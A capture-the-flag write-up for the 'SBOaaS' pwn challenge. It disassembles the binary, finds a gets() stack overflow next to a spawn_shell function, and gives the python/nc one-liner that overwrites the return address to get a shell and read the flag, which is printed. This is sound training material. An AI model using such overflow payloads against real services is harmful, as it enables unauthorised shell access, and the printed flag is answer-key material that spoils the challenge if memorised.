# Stage 4: SPOaaS - pwn - easy

## Challange

Welcome to Stack Buffer Overflow as a Service! Since modern mitigations made it more difficult to exploit vulnerabilities, we decided to offer an easy and convenient service for everyone to experience the joy of exploiting a stack-based buffer overflow. Simply enter your data and win! `nc 209.250.235.77 22222`

## Solution

First we can have a look wether the binary contains some interesting strings:

```sh
$ strings stack

...
[]A\A]A^A_
------------------------------------------------------------------
                              SBOaaS
------------------------------------------------------------------
Welcome to Stack Buffer Overflow as a Service
Since modern mitigations made it more difficult to exploit vulnerabilities,
we decided to offer an easy and convenient service for everyone
to experience the joy of exploiting a stack-based buffer overflow.
Simply enter your data and win!
Please enter your data. Good luck!
/bin/bash
Thank you for using SBOaaS :)
;*3$"
...
```

In deed we can see that there is a `/bin/bash` in there!

If we now have a look at the binary using `objdump` and dissassemble it we can see some ineteresting functions:

```sh
$ objdump -d stack

...
0000000000400657 <stack>:
  400657:	48 81 ec 48 05 00 00 	sub    $0x548,%rsp
  40065e:	48 8d 3d 23 01 00 00 	lea    0x123(%rip),%rdi        # 400788 <_IO_stdin_used+0x8>
  400665:	e8 b6 fe ff ff       	callq  400520 <puts@plt>
  40066a:	48 8d 3d 07 03 00 00 	lea    0x307(%rip),%rdi        # 400978 <_IO_stdin_used+0x1f8>
  400671:	b8 00 00 00 00       	mov    $0x0,%eax
  400676:	e8 b5 fe ff ff       	callq  400530 <printf@plt>
  40067b:	48 89 e7             	mov    %rsp,%rdi
  40067e:	e8 cd fe ff ff       	callq  400550 <gets@plt>
  400683:	48 81 c4 48 05 00 00 	add    $0x548,%rsp
  40068a:	c3                   	retq

000000000040068b <spawn_shell>:
  40068b:	48 83 ec 18          	sub    $0x18,%rsp
  40068f:	48 8d 3d 0a 03 00 00 	lea    0x30a(%rip),%rdi        # 4009a0 <_IO_stdin_used+0x220>
  400696:	48 89 3c 24          	mov    %rdi,(%rsp)
  40069a:	48 c7 44 24 08 00 00 	movq   $0x0,0x8(%rsp)
  4006a1:	00 00
  4006a3:	48 89 e6             	mov    %rsp,%rsi
  4006a6:	ba 00 00 00 00       	mov    $0x0,%edx
  4006ab:	e8 90 fe ff ff       	callq  400540 <execve@plt>
  4006b0:	48 83 c4 18          	add    $0x18,%rsp
  4006b4:	c3                   	retq

00000000004006b5 <main>:
  4006b5:	48 83 ec 08          	sub    $0x8,%rsp
  4006b9:	b9 00 00 00 00       	mov    $0x0,%ecx
  4006be:	ba 02 00 00 00       	mov    $0x2,%edx
  4006c3:	be 00 00 00 00       	mov    $0x0,%esi
  4006c8:	48 8b 3d 81 09 20 00 	mov    0x200981(%rip),%rdi        # 601050 <stdout@@GLIBC_2.2.5>
  4006cf:	e8 8c fe ff ff       	callq  400560 <setvbuf@plt>
  4006d4:	b8 00 00 00 00       	mov    $0x0,%eax
  4006d9:	e8 79 ff ff ff       	callq  400657 <stack>
  4006de:	48 8d 3d c5 02 00 00 	lea    0x2c5(%rip),%rdi        # 4009aa <_IO_stdin_used+0x22a>
  4006e5:	e8 36 fe ff ff       	callq  400520 <puts@plt>
  4006ea:	b8 00 00 00 00       	mov    $0x0,%eax
  4006ef:	48 83 c4 08          	add    $0x8,%rsp
  4006f3:	c3                   	retq
  4006f4:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
  4006fb:	00 00 00
  4006fe:	66 90                	xchg   %ax,%ax

...
```

We can see a few things here, mainly we have three functions of interest the `main`, `stack` and the `spawn_shell`.
as we can see, the function `stack` gets called from main `callq  400657 <stack>`.
Here comes the interesting part, in `stack` we allocate a buffer of size [1352] `sub    $0x548,%rsp`.

This is actualy something you can find when decompiling using [cutter](https://github.com/radareorg/cutter).

So what we want to do is pollute the stack and instead of returning to the `main` function from `stack` to jump
to `spawn_shell`. We can see that `spawn_shell` is at the address: 0x40068b.

We can generate our exploit using python (note that our system is litle endian):

```sh
# test it locally
$ (python -c "print '\x00' * 1352 + '\x8b\x06\x40\x00'"; cat -) | ./stack

# get the flag
$ (python -c "print '\x00' * 1352 + '\x8b\x06\x40\x00'"; cat -) | nc 209.250.235.77 22222

------------------------------------------------------------------
                              SBOaaS
------------------------------------------------------------------

Welcome to Stack Buffer Overflow as a Service

Since modern mitigations made it more difficult to exploit vulnerabilities,
we decided to offer an easy and convenient service for everyone
to experience the joy of exploiting a stack-based buffer overflow.
Simply enter your data and win!

Please enter your data. Good luck!
> cat flag.txt
junior-20165bcdbfebe4710bd0a1c168a5e752d999676e
```
